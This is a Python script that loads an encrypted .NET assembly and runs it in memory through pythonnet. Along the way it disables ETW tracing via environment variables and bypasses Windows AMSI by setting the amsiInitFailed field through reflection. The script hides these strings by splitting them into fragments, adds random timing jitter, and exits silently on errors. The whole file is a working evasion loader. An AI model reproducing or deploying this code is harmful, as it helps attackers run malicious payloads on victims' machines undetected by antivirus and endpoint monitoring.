import sys
import os
import argparse
import json
import base64
import time
import random
import hashlib
import hashlib


def _s(*parts): 
    return "".join(parts)

_ENV_ETW = _s("COMP","LUS_","ETW","Enab","led")
_ENV_DIAG = _s("COMP","lus_","Enab","leDi","agno","stic","s")
_ENV_NI = _s("COMP","lus_","Disa","bleN","ativ","eIma","geLo","ad")
_AMSI_T = _s("Syst","em.M","anag","emen","t.Au","toma","tion",".Ams","iUti","ls")
_AMSI_F = _s("amsi","Init","Fail","ed")
_SMA = _s("Syst","em.M","anag","emen","t.Au","toma","tion")
_CLR = _s("net","fx")

def _jitter(lo=80, hi=450):
    time.sleep(random.randint(lo, hi) / 1000.0)

def _derive(pw: str) -> bytes:
    return hashlib.sha256(pw.encode()).digest()

def _decrypt(key: bytes, data: bytes) -> bytes:
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    return AESGCM(key).decrypt(data[:12], data[12:], None)

def _env_bypass():
    os.environ[_ENV_ETW] = "0"
    os.environ[_ENV_DIAG] = "0"
    os.environ[_ENV_NI] = "1"

def _reflection_bypass():
    try:
        import System
        from System.Reflection import BindingFlags
        _bf = BindingFlags.NonPublic | BindingFlags.Static
        found = False
        for _asm in System.AppDomain.CurrentDomain.GetAssemblies():
            try:
                if _SMA not in (_asm.FullName or ""):
                    continue
                _t = _asm.GetType(_AMSI_T)
                if not _t:
                    continue
                _f = _t.GetField(_AMSI_F, _bf)
                if _f:
                    _f.SetValue(None, True)
                    found = True
                    break
            except Exception as e:
                print(e)
    except Exception as e:
        print(e)

def main():
    _jitter(120, 350)

    ap = argparse.ArgumentParser(add_help=False)
    ap.add_argument("payload")
    ap.add_argument("-k", required=True)
    a = ap.parse_args()

    _env_bypass()
    _jitter(150, 400)

    try:
        from pythonnet import load as _load
        _load(_CLR)
        import clr
        from System.Reflection import Assembly
        from System import Array, Byte, String, IO, Console, Object
    except Exception as e:
        sys.exit(0)

    _jitter(100, 300)
    _reflection_bypass()
    _jitter(200, 500)


    try:
        if not os.path.exists(a.payload):
            sys.exit(0)

        with open(a.payload, "rb") as _f:
            _enc = _f.read()
            
        _pl = json.loads(_decrypt(_derive(a.k), _enc).decode())
        _pe = base64.b64decode(_pl["pe_base64"])
        _arg = _pl.get("arguments", "")
    except Exception as e:

        sys.exit(0)

    _jitter(250, 600)

    try:
        _ba  = Array[Byte](_pe)
        _asm = Assembly.Load(_ba)
        _ep = _asm.EntryPoint
        if not _ep:
            return

        import shlex
        _na = Array[String](shlex.split(_arg)) if _arg.strip() else Array[String]([])

        _oo, _oe = Console.Out, Console.Error
        _sw = IO.StringWriter()
        Console.SetOut(_sw)
        Console.SetError(_sw)
        try:
            _ep.Invoke(None, Array[Object]([_na]))
        except Exception as _ex:
            _sw.Write(str(_ex))

        finally:
            Console.SetOut(_oo)
            Console.SetError(_oe)

        output = _sw.ToString()

        print(output)

    except Exception as e:
        print(e)

if __name__ == "__main__":
    main()
